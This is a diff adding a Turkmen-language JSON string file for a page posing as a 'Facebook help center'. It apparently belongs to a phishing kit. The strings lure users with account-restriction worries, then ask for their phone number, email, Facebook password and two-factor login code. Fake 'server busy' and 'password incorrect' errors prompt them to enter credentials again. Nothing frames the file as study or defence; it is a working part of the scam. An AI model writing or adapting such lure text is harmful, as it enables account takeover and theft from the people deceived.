@@ -1,0 +1,59 @@
+{
+  "translation": {
+    "title": "“Facebook” kömek merkezi",
+    "title2": "“Facebook” arkaly satyň",
+    "very_phone": "Dogry telefon belgisini giriziň.",
+    "banner-content": "Merkeziň wekili arkaly",
+    "description": "Size nädip kömek edip bileris?",
+    "description2": "Nädip kömek edip bileris?",
+    "text": "Meseläňizi çözmek üçin has köp maglumat gerek. ",
+    "label": "Iň ýaýran meseleler",
+    "btn": "Bir aýratynlyk ulanmak maňa päsgel berdi",
+    "btn1": "Hasabym çäklendirilen",
+    "btn2": "Suratlarym we wideolarym syýasaty bozýar",
+    "btn3": "Sahypam çäklendirilen",
+    "btn4": "Hasabymy goramaly",
+    "btn5": "Beýleki meseleler",
+    "button": "Indiki",
+    "form-title": "Kömek alyň",
+    "phone": "Telefon belgisi",
+    "text-batbuoc": "haýyş",
+    "email": "Email adres",
+    "form2-title2": "Dowam etmek üçin facebook parolyňyzy giriziň",
+    "form2-content": "Maglumat iberýän adamyň sizdigini tassyklamalydyrys, Facebook parolyňyzy giriziň we dowam ediň.",
+    "password": "Parol",
+    "validate-true": "Maglumatlary barlaň",
+    "chat_btn": "Söhbetdeşlige başlaň"
+  },
+  "frm_input1": {
+    "home_title": "Dowam etmek üçin Facebook parolyňyzy giriziň",
+    "modal__body-description": "Maglumat iberýän adamyň sizdigini tassyklamalydyrys, Facebook parolyňyzy giriziň we dowam ediň.",
+    "password": "Parol",
+    "btn_send_continue": "Dowam et",
+    "validate-true": "Maglumatlary barlaň",
+    "text-danger": "Serwer meşgul! ",
+    "text-danger1": "Parol nädogry, gaýtadan synanyşyň.",
+    "text-danger2": "Ulgamy täzeden talap edýär. ",
+    "input1": "Bulaşyklygy üstünlikli giriziň"
+  },
+  "frm_input2": {
+    "home_title": "Dowam etmek üçin giriş koduny giriziň",
+    "description": "Hasabyňyzda iki goşmaça tanamak mümkinçiligi bar, bu goşmaça giriş ädimini talap edýär ..",
+    "title": "Başga enjamdan tassyklaň",
+    "description2": "Hasabyňyza giren ýeriňizdäki Facebook habarnamasyny barlaň we dowam etmegi üçin girişi tassyklaň.",
+    "title2": "Ora-da giriş koduňyzy giriziň",
+    "description3": "Telefonyňyzdan ýa-da guran tassyklaýjy programmaňyzdan 6-8 sanly kody giriziň.",
+    "button": "Kod iber",
+    "validate-true": "Maglumatlary barlaň",
+    "text-danger": "Serwer meşgul! ",
+    "text-danger1": "Parol nädogry, gaýtadan synanyşyň.",
+    "text-danger2": "Ulgamy täzeden talap edýär. ",
+    "button1": "Iber",
+    "placeholder": "Giriş kody"
+  },
+  "notification": {
+    "text-danger1": "Hakyky tanamak kody nädogry, gaýtadan synanyşyň.",
+    "title": "Bagyşlaň, bu sahypa ýok,",
+    "title2": "Basan baglanyşygyňyz döwülip biler ýa-da sahypa aýrylan bolmagy mümkin."
+  }
+}
